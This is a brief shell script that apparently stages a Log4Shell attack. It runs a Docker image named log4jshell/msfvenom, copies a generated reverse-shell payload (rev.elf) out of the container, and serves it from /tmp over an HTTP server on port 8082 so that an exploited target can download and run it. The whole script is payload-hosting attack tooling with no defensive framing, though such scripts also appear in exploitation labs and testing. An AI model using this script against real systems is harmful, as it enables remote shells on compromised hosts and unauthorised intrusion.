#!/bin/sh
set -ex
docker run --name=msfvenom log4jshell/msfvenom
sleep 2
docker cp msfvenom:/tmp/rev.elf /tmp/rev.elf
cd /tmp
python3 -m http.server 8082
